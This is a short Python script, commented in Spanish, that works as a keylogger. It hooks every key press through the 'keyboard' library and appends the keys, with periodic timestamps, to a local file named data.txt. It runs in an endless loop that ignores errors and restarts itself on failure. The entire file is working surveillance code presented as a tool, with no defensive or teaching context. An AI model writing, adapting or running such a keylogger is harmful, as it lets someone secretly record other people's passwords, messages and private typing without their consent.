import keyboard
import time
from datetime import datetime
import os
import subprocess

# Archivo donde se guardarán las teclas presionadas
output_file = 'data.txt'
key_log = []  # Lista para acumular las teclas
flush_interval = 60  # Intervalo de tiempo para escribir el timestamp (en segundos)

def format_key(key):
    """Formatea la clave para que sea más legible en el archivo."""
    if key.name == 'space':
        return ' '
    elif key.name == 'enter':
        return '\n'
    elif key.name == 'backspace':
        return ' '  # Registra un espacio en lugar de [BACKSPACE]
    elif key.name == 'tab':
        return '[TAB]'
    elif key.name == 'shift':
        return '[SHIFT]'
    elif key.name == 'ctrl':
        return '[CTRL]'
    elif key.name == 'alt':
        return '[ALT]'
    elif key.name == 'backslash':
        return '\\'
    else:
        return key.name

def pressed_keys(key):
    """Acumula las teclas presionadas y las escribe inmediatamente en el archivo."""
    global last_flush_time
    formatted_key = format_key(key)

    # Escribir directamente en el archivo
    with open(output_file, 'a', encoding='utf-8') as file:
        # Escribir timestamp cada minuto
        current_time = datetime.now()
        if (current_time - last_flush_time).seconds >= flush_interval:
            file.write(f"{current_time.strftime('%Y-%m-%d %H:%M:%S')}: ")
            last_flush_time = current_time
            
        file.write(formatted_key)

def start_keylogger():
    """Inicia el keylogger."""
    global last_flush_time
    last_flush_time = datetime.now()

    # Hook de las teclas
    keyboard.on_press(pressed_keys)

    # Mantiene el programa en ejecución
    while True:
        try:
            keyboard.wait()  # Espera a que se presione una tecla
        except Exception as e:
            continue

if __name__ == "__main__":
    # Ejecutar el keylogger en segundo plano
    try:
        # Llamada a la función que inicia el keylogger
        start_keylogger()
    except Exception as e:
        # Si el keylogger falla, puedes reiniciarlo aquí
        start_keylogger()
